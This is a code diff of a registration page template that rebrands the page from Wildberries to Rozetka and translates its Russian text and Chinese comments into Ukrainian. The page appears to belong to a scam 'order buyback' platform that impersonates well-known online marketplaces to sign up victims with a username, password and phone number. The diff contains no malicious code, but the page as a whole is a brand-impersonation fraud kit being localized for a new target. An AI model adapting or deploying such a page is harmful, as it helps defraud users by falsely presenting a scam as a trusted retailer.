@@ -9,12 +9,12 @@
 }</style>
 	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 	<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0">
-	<title>зарегистрироваться - Wildberries</title>
-	<meta name="keywords" content="Платформа обратного выкупа для российских торговцев">
+	<title>зареєструватися - Rozetka</title>
+	<meta name="keywords" content="Платформа зворотного викупу для російських торговців">
 	<meta name="description"
-		content="Коллекции женской, мужской и детской одежды, обуви, а также товары для дома и спорта. Информация о доставке и оплате. Таблицы размеров, советы по уходу за вещами.">
+		content="Колекції жіночого, чоловічого та дитячого одягу, взуття, а також товари для дому та спорту. Інформація про доставку та оплату. Таблиці розмірів, поради щодо догляду за речами.">
 	<meta name="format-detection" content="telephone=no">
-	<link rel="shortcut icon" type="image/ico" href="https://wbbff.cc/favicon.ico">
+	<link rel="shortcut icon" type="image/ico" href="<?php echo asset("assets/favicon.ico") ?>">
 	<link type="text/css" rel="stylesheet" href="<?php echo asset("assets/style.css")?>">
 	<script type="text/javascript" src="<?php echo asset("assets/jquery.js")?>"></script>
 	<script type="text/javascript" src="<?php echo asset("assets/global.js")?>"></script>
@@ -29,7 +29,7 @@
 		}
 	</style>
 	<div class="login_top">
-		<div class="zc_tt" style="color:#000;">зарегистрироваться</div>
+		<div class="zc_tt" style="color:#000;">зареєструватися</div>
 		<div class="top_dl"><img src="<?php echo asset("assets/345645615.svg")?>"></div>
 		<a class="u_fh" href="<?php echo route("index") ?>"><i class="sy_ico"></i></a>
 	</div>
@@ -38,35 +38,35 @@
 			@csrf
 			<div class="zc_box1">
 				<div class="dl_sx">
-					<a href="javascript:;" class="logintype js_reg sel" reg_type="phone">зарегистрироваться по phone</a>
-					<!-- <a href="javascript:;" class="logintype js_reg" reg_type="email">зарегистрироваться по email</a> -->
+					<a href="javascript:;" class="logintype js_reg sel" reg_type="phone">зареєструватися за телефоном</a>
+					<!-- <a href="javascript:;" class="logintype js_reg" reg_type="email">зареєструватися за email</a> -->
 					<div class="clear"></div>
 				</div>
 				<div class="clear"></div>
 				<div class="zc_list">
 					<div class="zc_mal zc_i1"><input type="text" name="login" class="zc_input1"
-							placeholder="имя пользователя(длина 5~15)"></div>
+							placeholder="ім'я користувача(довжина 5~15)"></div>
 				</div>
 				<div class="zc_list">
 					<div class="zc_mal zc_i2">
 						<input type="password" style="display:none;width:0;height:0;">
-						<input type="password" name="password" class="zc_input1" placeholder="пароль(длина 6~20)"
+						<input type="password" name="password" class="zc_input1" placeholder="пароль(довжина 6~20)"
 							autocomplete="new-password">
 					</div>
 				</div>
 				<!--<div class="zc_list">
-			<div class="zc_mal zc_i2"><input type="password" name="user_pw1" class="zc_input1" placeholder="Введите пароль еще раз" /></div>
+			<div class="zc_mal zc_i2"><input type="password" name="user_pw1" class="zc_input1" placeholder="Введіть пароль ще раз" /></div>
 		</div>-->
 				<div class="zc_list js_phone" style="border-bottom: 0px;">
 					<div class="zc_mal zc_i5"><input type="text" name="phone" maxlength="15" class="zc_input1"
-							placeholder="Введите номер телефона"></div>
+							placeholder="Введіть номер телефону"></div>
 				</div>
 				<!-- 		<div class="zc_list js_email">
 			<div class="zc_mal zc_i3"><input type="text" name="user_email" class="zc_input1" placeholder="Email" /></div>
 		</div> -->
 				<!--<div class="zc_list">
 			<div class="zc_mal zc_i4">
-				<input type="text" name="authcode" class="zc_input1" placeholder="图片验证码" />
+				<input type="text" name="authcode" class="zc_input1" placeholder="код підтвердження" />
 				<img src="https://wbbff.cc/public/class/authcode.class.php?w=100&h=41" onclick="pe_yzm(this)" class="zc_imgyzm" style="cursor:pointer;" />
 			</div>
 		</div>-->
@@ -75,17 +75,17 @@
 				<input type="hidden" name="reg_type" value="phone">
 				<input type="hidden" name="pesubmit">
 				<input type="hidden" name="agent_line" value="">
-				<input type="button" value="зарегистрироваться">
+				<input type="button" value="зареєструватися">
 			</div>
 		</form>
 		<div class="zh_zc1" style="text-align:center;"><a href="<?php echo route("auth.login")?>"
-				title="Войти">Войти</a></div>
+				title="Увійти">Увійти</a></div>
 	</div>
 	<script type="text/javascript">
 		function getUrlParam(name) {
-			var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)"); //构造一个含有目标参数的正则表达式对象\
-			var r = window.location.search.substr(1).match(reg);  //匹配目标参数
-			if (r != null) return unescape(r[2]); return null; //返回参数值
+			var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)"); //конструювання регулярного виразу, що містить цільовий параметр\
+			var r = window.location.search.substr(1).match(reg);  //співставлення цільового параметра
+			if (r != null) return unescape(r[2]); return null; //повернення значення параметра
 		}
 
 		$(function () {
@@ -124,36 +124,36 @@
 			$(".js_reg:eq(0)").click();
 			$(":button").click(function () {
 				if ($(":input[name='login']").val() == '') {
-					app_tip("Введите имя пользователя");
+					app_tip("Введіть ім'я користувача");
 					return false;
 				}
 				if ($(":input[name='password']").val() == '') {
-					app_tip("Введите пароль");
+					app_tip("Введіть пароль");
 					return false;
 				}
 				/*if ($(":input[name='user_pw1']").val() == '') {
-					app_tip("请填写确认密码");
+					app_tip("Будь ласка, введіть пароль підтвердження");
 					return false;
 				}
 				if ($(":input[name='user_pw']").val() != $(":input[name='user_pw1']").val()) {
-					app_tip("两次密码不一致");
+					app_tip("Паролі не співпадають");
 					return false;
 				}*/
 				if ($(":input[name='reg_type']").val() == 'email' && $(":input[name='user_email']").val() == '') {
-					app_tip("请填写电子邮箱");
+					app_tip("Будь ласка, введіть електронну пошту");
 					return false;
 				}
 				if ($(":input[name='reg_type']").val() == 'phone' && $(":input[name='user_phone']").val() == '') {
-					app_tip("Введите номер телефона");
+					app_tip("Введіть номер телефону");
 					return false;
 				}
 				/*if ($(":input[name='authcode']").val() == '') {
-					app_tip("请填写图形验证码");
+					app_tip("Будь ласка, введіть код підтвердження");
 					return false;
 				}*/
-				$(this).val("в отправлять.");
+				$(this).val("відправляється.");
 				app_submit("<?php echo route("user.api.register") ?>", function (json) {
-					if (json.message == "User registered and logged in successfully") {
+					if (json.message == "Користувач зареєстрований та увійшов успішно") {
 						if ('' != '') {
 							app_open('', 1000);
 						}
@@ -162,7 +162,7 @@
 						}
 					}
 					else {
-						$(":button").val("зарегистрироваться");
+						$(":button").val("зареєструватися");
 					}
 				})
 			})
@@ -174,7 +174,7 @@
 	<script type="text/javascript" src="<?php echo asset("assets/layer.js")?>"></script>
 	<script type="text/javascript" src="<?php echo asset("assets/app.js")?>"></script>
 	<script type="text/javascript">
-		//顶部菜单点击
+		//клік верхнього меню
 		function top_menu() {
 			if ($("#top_menu").is(":hidden")) {
 				$("#top_menu").show();
@@ -191,13 +191,13 @@
 	<script>
 		function confirm_huigou(order_id) {
 			layer.open({
-				content: "Определить выкуп этого Заказ？",
-				btn: ["OK", "Отмена"],
+				content: "Визначити викуп цього Замовлення？",
+				btn: ["OK", "Скасувати"],
 				shadeClose: false,
 				yes: function () {
 
 					/*layer.open({
-						content: '你点了确认',
+						content: 'Ви натиснули підтвердити',
 						time: 1
 					});*/
 					$.ajax({
